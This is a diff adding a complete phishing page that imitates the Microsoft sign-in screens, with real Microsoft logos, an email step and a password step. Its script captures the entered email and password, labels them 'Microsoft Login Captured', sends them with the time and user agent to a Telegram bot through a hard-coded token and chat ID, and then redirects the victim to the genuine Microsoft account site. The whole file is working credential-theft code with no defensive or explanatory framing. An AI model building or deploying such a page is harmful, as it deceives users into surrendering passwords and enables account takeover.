@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to your Microsoft account</title>
+  <link rel="icon" type="image/svg+xml" href="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg">
+  <link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png">
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 0;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      position: relative;
+      overflow: hidden;
+    }
+
+    body.theme-light { background: #f2f6fc; }
+    body.theme-light .shape-dark { display: none; }
+    body.theme-light .shape-light { display: block; }
+    body.theme-light .stars { display: none; }
+
+    .shape-light-1 {
+      position: absolute;
+      bottom: -18%;
+      left: -12%;
+      width: 55vw;
+      height: 55vw;
+      background: linear-gradient(160deg, #e4ecf8 0%, #dde8f5 40%, #d0dff0 100%);
+      border-radius: 40% 60% 50% 50%;
+      opacity: 0.75;
+      filter: blur(1px);
+      transform: rotate(-15deg);
+      pointer-events: none;
+    }
+    .shape-light-2 {
+      position: absolute;
+      top: -22%;
+      right: -10%;
+      width: 60vw;
+      height: 60vw;
+      background: linear-gradient(200deg, #e8f0fa 0%, #dce8f5 50%, #d2e0f0 100%);
+      border-radius: 45% 55% 60% 40%;
+      opacity: 0.65;
+      filter: blur(2px);
+      transform: rotate(20deg);
+      pointer-events: none;
+    }
+    .shape-light-3 {
+      position: absolute;
+      top: 5%;
+      left: 30%;
+      width: 25vw;
+      height: 35vh;
+      border-left: 2px solid rgba(180,200,230,0.35);
+      border-radius: 50% 0 0 50%;
+      transform: rotate(15deg);
+      pointer-events: none;
+    }
+    .shape-light-4 {
+      position: absolute;
+      top: -5%;
+      right: 15%;
+      width: 3px;
+      height: 40vh;
+      background: linear-gradient(180deg, rgba(170,195,225,0.2) 0%, rgba(170,195,225,0.05) 100%);
+      transform: rotate(-25deg);
+      pointer-events: none;
+    }
+    .shape-light-5 {
+      position: absolute;
+      bottom: -10%;
+      right: -5%;
+      width: 40vw;
+      height: 40vw;
+      background: radial-gradient(circle, rgba(220,235,250,0.5) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    body.theme-dark { background: #1a1c24; }
+    body.theme-dark .shape-light { display: none; }
+    body.theme-dark .shape-dark { display: block; }
+    body.theme-dark .stars { display: block; }
+
+    .shape-dark-1 {
+      position: absolute;
+      bottom: -18%;
+      left: -12%;
+      width: 55vw;
+      height: 55vw;
+      background: linear-gradient(160deg, #2a2d3a 0%, #232631 40%, #1e212d 100%);
+      border-radius: 40% 60% 50% 50%;
+      opacity: 0.6;
+      filter: blur(1px);
+      transform: rotate(-15deg);
+      pointer-events: none;
+    }
+    .shape-dark-2 {
+      position: absolute;
+      top: -22%;
+      right: -10%;
+      width: 60vw;
+      height: 60vw;
+      background: linear-gradient(200deg, #2e3140 0%, #262a38 50%, #1f2230 100%);
+      border-radius: 45% 55% 60% 40%;
+      opacity: 0.5;
+      filter: blur(2px);
+      transform: rotate(20deg);
+      pointer-events: none;
+    }
+    .shape-dark-3 {
+      position: absolute;
+      top: 5%;
+      left: 30%;
+      width: 25vw;
+      height: 35vh;
+      border-left: 2px solid rgba(100,110,140,0.2);
+      border-radius: 50% 0 0 50%;
+      transform: rotate(15deg);
+      pointer-events: none;
+    }
+    .shape-dark-4 {
+      position: absolute;
+      top: -5%;
+      right: 15%;
+      width: 3px;
+      height: 40vh;
+      background: linear-gradient(180deg, rgba(90,100,130,0.15) 0%, rgba(90,100,130,0.03) 100%);
+      transform: rotate(-25deg);
+      pointer-events: none;
+    }
+    .shape-dark-5 {
+      position: absolute;
+      bottom: -10%;
+      right: -5%;
+      width: 40vw;
+      height: 40vw;
+      background: radial-gradient(circle, rgba(60,70,100,0.3) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .stars {
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      pointer-events: none;
+      z-index: 0;
+      display: none;
+    }
+    .star {
+      position: absolute;
+      width: 2px;
+      height: 2px;
+      background: rgba(255,255,255,0.3);
+      border-radius: 50%;
+    }
+
+    .ms-card {
+      position: relative;
+      z-index: 2;
+      width: 440px;
+      padding: 44px;
+      display: none;
+    }
+    .ms-card.active { display: block; }
+
+    .card-light {
+      background: #ffffff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.08), 0 4px 12px rgba(0,0,0,0.05);
+    }
+
+    .card-dark {
+      background: #2d2f38;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.4), 0 8px 30px rgba(0,0,0,0.3);
+    }
+
+    .card-light .ms-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 16px; }
+    .card-light .ms-logo img { width: 108px; height: auto; display: block; }
+    .card-light .ms-title { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 20px 0; line-height: 1.2; }
+    .card-light .ms-input {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid rgba(0,0,0,0.6);
+      padding: 6px 0;
+      font-size: 15px;
+      color: #1b1b1b;
+      outline: none;
+      background: transparent;
+      margin-bottom: 16px;
+      font-family: inherit;
+    }
+    .card-light .ms-input::placeholder { color: #737373; }
+    .card-light .ms-input:focus { border-bottom: 1px solid #0067b8; }
+    .card-light .ms-link { color: #0067b8; text-decoration: none; font-size: 13px; line-height: 1.5; display: inline-block; }
+    .card-light .ms-link:hover { text-decoration: underline; color: #005da6; }
+    .card-light .ms-text-row { margin-bottom: 6px; }
+    .card-light .ms-next-btn {
+      float: right;
+      background: #0067b8;
+      color: #ffffff;
+      border: none;
+      padding: 6px 24px;
+      font-size: 15px;
+      font-family: inherit;
+      cursor: pointer;
+      margin-top: 12px;
+      min-width: 80px;
+    }
+    .card-light .ms-next-btn:hover { background: #005da6; }
+
+    .card-dark .ms-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      margin-bottom: 20px;
+    }
+    .card-dark .ms-back-btn {
+      position: absolute;
+      left: 0;
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 0;
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .card-dark .ms-back-btn:hover { opacity: 0.7; }
+    .card-dark .ms-logo { display: flex; align-items: center; gap: 8px; }
+    .card-dark .ms-logo img { width: 108px; height: auto; display: block; }
+    .card-dark .ms-email-chip {
+      display: block;
+      background: transparent;
+      border: 1px solid rgba(255,255,255,0.25);
+      border-radius: 16px;
+      padding: 4px 14px;
+      font-size: 13px;
+      color: #ccc;
+      margin: 0 auto 16px auto;
+      text-align: center;
+      width: fit-content;
+    }
+    .card-dark .ms-title { font-size: 24px; font-weight: 600; color: #ffffff; margin: 0 0 20px 0; line-height: 1.2; text-align: center; }
+    .card-dark .ms-input-wrap { position: relative; margin-bottom: 16px; }
+    .card-dark .ms-input {
+      width: 100%;
+      border: 1px solid rgba(255,255,255,0.25);
+      border-radius: 2px;
+      padding: 10px 36px 10px 10px;
+      font-size: 15px;
+      color: #ffffff;
+      outline: none;
+      background: transparent;
+      font-family: inherit;
+    }
+    .card-dark .ms-input::placeholder { color: #999; }
+    .card-dark .ms-input:focus { border-color: #4a90d9; }
+    .card-dark .ms-eye-btn {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: #999;
+      cursor: pointer;
+      padding: 0;
+      font-size: 16px;
+    }
+    .card-dark .ms-eye-btn:hover { color: #ccc; }
+    .card-dark .ms-link { color: #7ec0ee; text-decoration: none; font-size: 13px; line-height: 1.5; display: inline-block; }
+    .card-dark .ms-link:hover { text-decoration: underline; }
+    .card-dark .ms-text-row { margin-bottom: 6px; }
+    .card-dark .ms-next-btn {
+      width: 100%;
+      background: #3b7fc4;
+      color: #ffffff;
+      border: none;
+      padding: 8px 24px;
+      font-size: 15px;
+      font-family: inherit;
+      cursor: pointer;
+      margin-top: 12px;
+      border-radius: 2px;
+    }
+    .card-dark .ms-next-btn:hover { background: #3570b0; }
+    .card-dark .ms-center-link { text-align: center; margin-top: 20px; }
+
+    .ms-clearfix::after { content: ""; display: table; clear: both; }
+
+    .ms-options-card {
+      position: relative;
+      z-index: 2;
+      background: #ffffff;
+      width: 440px;
+      margin-top: 16px;
+      padding: 12px 44px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.08), 0 4px 12px rgba(0,0,0,0.05);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+      display: none;
+    }
+    .ms-options-card.active { display: flex; }
+    .ms-options-card:hover { background: #f9f9f9; }
+    .ms-options-icon { width: 16px; height: 16px; opacity: 0.7; }
+    .ms-options-text { font-size: 15px; color: #1b1b1b; }
+
+    .ms-loader {
+      display: none;
+      position: relative;
+      z-index: 2;
+      text-align: center;
+    }
+    .ms-loader.active { display: block; }
+    .ms-loader-dots { display: inline-block; }
+    .ms-loader-dots::after {
+      content: "";
+      animation: dots 1.5s steps(5, end) infinite;
+    }
+    @keyframes dots {
+      0%   { content: ""; }
+      20%  { content: "."; }
+      40%  { content: ".."; }
+      60%  { content: "..."; }
+      80%  { content: "...."; }
+      100% { content: "....."; }
+    }
+    .ms-loader-light { color: #1b1b1b; font-size: 18px; }
+    .ms-loader-dark  { color: #ffffff; font-size: 28px; }
+
+    .ms-spinner {
+      display: none;
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      color: #fff;
+    }
+    .ms-spinner.active { display: block; }
+    .ms-spinner-ring {
+      width: 40px;
+      height: 40px;
+      border: 3px solid rgba(255,255,255,0.2);
+      border-top: 3px solid #3b7fc4;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 16px auto;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .ms-spinner-text { font-size: 15px; color: #ccc; }
+
+    .ms-footer {
+      position: absolute;
+      bottom: 12px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2;
+      font-size: 12px;
+      text-align: center;
+    }
+    .ms-footer a { text-decoration: none; margin: 0 8px; }
+    .ms-footer a:hover { text-decoration: underline; }
+    .footer-light { color: #1b1b1b; }
+    .footer-light a { color: #1b1b1b; }
+    .footer-dark { color: #888; }
+    .footer-dark a { color: #888; }
+    .ms-footer-link-blue { color: #7ec0ee; }
+    .footer-note { margin-top: 4px; font-size: 11px; }
+    .footer-note-light { color: #666; }
+    .footer-note-dark { color: #666; }
+  </style>
+<base target="_blank">
+</head>
+<body class="theme-light">
+  <div class="stars" id="stars"></div>
+
+  <div class="shape-light shape-light-1"></div>
+  <div class="shape-light shape-light-2"></div>
+  <div class="shape-light shape-light-3"></div>
+  <div class="shape-light shape-light-4"></div>
+  <div class="shape-light shape-light-5"></div>
+
+  <div class="shape-dark shape-dark-1"></div>
+  <div class="shape-dark shape-dark-2"></div>
+  <div class="shape-dark shape-dark-3"></div>
+  <div class="shape-dark shape-dark-4"></div>
+  <div class="shape-dark shape-dark-5"></div>
+
+  <!-- Page 1: Email (Light) -->
+  <div id="page-email">
+    <div class="ms-card card-light active" id="card-email">
+      <div class="ms-logo">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" />
+      </div>
+      <h1 class="ms-title">Sign in</h1>
+      <input class="ms-input" id="email-input" type="text" placeholder="Email, phone, or Skype" />
+      <div class="ms-text-row">
+        <span style="font-size:13px;color:#1b1b1b;">No account? </span>
+        <a class="ms-link" href="#">Create one!</a>
+      </div>
+      <div class="ms-text-row">
+        <a class="ms-link" href="#">Can not access your account?</a>
+      </div>
+      <div class="ms-clearfix">
+        <button class="ms-next-btn" id="btn-email-next">Next</button>
+      </div>
+    </div>
+
+    <div class="ms-options-card active" id="options-email">
+      <svg class="ms-options-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"/>
+        <line x1="8" y1="12" x2="16" y2="12"/>
+      </svg>
+      <span class="ms-options-text">Sign-in options</span>
+    </div>
+  </div>
+
+  <!-- Loader -->
+  <div class="ms-loader ms-loader-light" id="loader">
+    <div class="ms-loader-dots"></div>
+  </div>
+
+  <!-- Page 2: Password (Dark) -->
+  <div id="page-password" style="display:none;">
+    <div class="ms-card card-dark" id="card-password">
+      <div class="ms-header">
+        <button class="ms-back-btn" id="btn-back">&#8592;</button>
+        <div class="ms-logo">
+          <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" />
+        </div>
+      </div>
+      <div class="ms-email-chip" id="display-email">user@example.com</div>
+      <h1 class="ms-title">Enter your password</h1>
+      <div class="ms-input-wrap">
+        <input class="ms-input" id="password-input" type="password" placeholder="Password" />
+        <button class="ms-eye-btn" id="btn-eye">&#128065;</button>
+      </div>
+      <div class="ms-text-row">
+        <a class="ms-link" href="#">Forgot my password</a>
+      </div>
+      <button class="ms-next-btn" id="btn-signin">Sign in</button>
+      <div class="ms-center-link">
+        <a class="ms-link" href="#">Other ways to sign in</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signing in spinner -->
+  <div class="ms-spinner" id="spinner">
+    <div class="ms-spinner-ring"></div>
+    <div class="ms-spinner-text">Signing in...</div>
+  </div>
+
+  <div class="ms-footer footer-light" id="footer">
+    <a href="#">Terms of use</a>
+    <a href="#">Privacy &amp; cookies</a>
+    <span style="margin-left:4px;">...</span>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "8659940319:AAG9UZ6sJct_6wMMheMHIhPuHABN*******";
+    const TELEGRAM_CHAT_ID   = "-4997638***";
+
+    const starsContainer = document.getElementById("stars");
+    for (let i = 0; i < 60; i++) {
+      const star = document.createElement("div");
+      star.className = "star";
+      star.style.left = Math.random() * 100 + "%";
+      star.style.top = Math.random() * 100 + "%";
+      star.style.opacity = Math.random() * 0.5 + 0.1;
+      star.style.width = (Math.random() * 2 + 1) + "px";
+      star.style.height = star.style.width;
+      starsContainer.appendChild(star);
+    }
+
+    const emailInput = document.getElementById("email-input");
+    const btnEmailNext = document.getElementById("btn-email-next");
+    const pageEmail = document.getElementById("page-email");
+    const loader = document.getElementById("loader");
+    const pagePassword = document.getElementById("page-password");
+    const displayEmail = document.getElementById("display-email");
+    const btnBack = document.getElementById("btn-back");
+    const passwordInput = document.getElementById("password-input");
+    const btnEye = document.getElementById("btn-eye");
+    const btnSignin = document.getElementById("btn-signin");
+    const spinner = document.getElementById("spinner");
+    const footer = document.getElementById("footer");
+
+    let storedEmail = "";
+    let storedPassword = "";
+
+    function setDarkTheme() {
+      document.body.classList.remove("theme-light");
+      document.body.classList.add("theme-dark");
+      footer.className = "ms-footer footer-dark";
+      footer.innerHTML = '<a href="#">Help and feedback</a><a href="#">Terms of use</a><a href="#">Privacy and cookies</a><div class="footer-note footer-note-dark">Use private browsing if this is not your device. <a href="#" class="ms-footer-link-blue">Learn more</a></div>';
+    }
+
+    function setLightTheme() {
+      document.body.classList.remove("theme-dark");
+      document.body.classList.add("theme-light");
+      footer.className = "ms-footer footer-light";
+      footer.innerHTML = '<a href="#">Terms of use</a><a href="#">Privacy &amp; cookies</a><span style="margin-left:4px;">...</span>';
+    }
+
+    function sendToTelegram(message) {
+      if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
+        console.warn("Telegram bot not configured. Message would be:\n" + message);
+        return;
+      }
+      const url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      }).catch(function(err) {
+        console.error("Failed to send to Telegram:", err);
+      });
+    }
+
+    btnEmailNext.addEventListener("click", function() {
+      const email = emailInput.value.trim();
+      if (!email) { emailInput.focus(); return; }
+      storedEmail = email;
+      pageEmail.style.display = "none";
+      loader.classList.add("active");
+      setTimeout(function() {
+        loader.classList.remove("active");
+        setDarkTheme();
+        displayEmail.textContent = email;
+        pagePassword.style.display = "block";
+        document.getElementById("card-password").classList.add("active");
+        passwordInput.focus();
+      }, 1500);
+    });
+
+    emailInput.addEventListener("keypress", function(e) {
+      if (e.key === "Enter") btnEmailNext.click();
+    });
+
+    btnBack.addEventListener("click", function() {
+      pagePassword.style.display = "none";
+      document.getElementById("card-password").classList.remove("active");
+      setLightTheme();
+      pageEmail.style.display = "block";
+      document.getElementById("card-email").classList.add("active");
+      document.getElementById("options-email").classList.add("active");
+    });
+
+    btnEye.addEventListener("click", function() {
+      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+    });
+
+    btnSignin.addEventListener("click", function() {
+      const password = passwordInput.value.trim();
+      if (!password) { passwordInput.focus(); return; }
+      storedPassword = password;
+
+      pagePassword.style.display = "none";
+      spinner.classList.add("active");
+
+      const now = new Date().toLocaleString();
+      const ua = navigator.userAgent;
+      const message = "Microsoft Login Captured\n\nEmail: " + storedEmail + "\nPassword: " + storedPassword + "\n\nTime: " + now + "\nUser-Agent: " + ua;
+
+      sendToTelegram(message);
+
+      setTimeout(function() {
+        window.location.href = "https://account.microsoft.com/";
+      }, 2500);
+    });
+
+    passwordInput.addEventListener("keypress", function(e) {
+      if (e.key === "Enter") btnSignin.click();
+    });
+  </script>
+</body>
+</html>
